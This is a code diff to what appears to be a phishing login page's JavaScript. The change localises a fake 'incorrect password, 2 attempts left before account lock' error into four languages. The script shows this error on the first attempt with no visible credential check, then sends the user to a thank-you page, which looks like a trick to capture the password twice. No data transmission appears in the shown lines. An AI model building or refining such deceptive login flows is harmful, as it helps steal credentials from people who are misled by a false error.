@@ -45,9 +45,18 @@ document.addEventListener("DOMContentLoaded", function () {
     step2Button.addEventListener("click", function (e) {
       e.preventDefault();
 
+      // Mehrsprachige Fehlermeldung
+      const messages = {
+        de: "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.",
+        en: "Incorrect password. 2 attempts left before account lock.",
+        fr: "Mot de passe incorrect. Encore 2 tentatives avant le blocage du compte.",
+        es: "Contraseña incorrecta. Quedan 2 intentos antes de bloquear la cuenta."
+      };
+
+      const lang = document.documentElement.lang || "de";
+
       if (firstTry) {
-        
-        passwordError.textContent = "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.";
+        passwordError.textContent = messages[lang] || messages["de"];
         passwordError.style.display = "block";
         passwordInput.value = "";
         passwordInput.focus();
@@ -57,7 +66,7 @@ document.addEventListener("DOMContentLoaded", function () {
         passwordError.style.display = "none";
 
         const selectedLang = document.getElementById("language")?.value || "de";
-        let targetPage = "danke.html"; 
+        let targetPage = "danke.html";
 
         switch (selectedLang) {
           case "en":
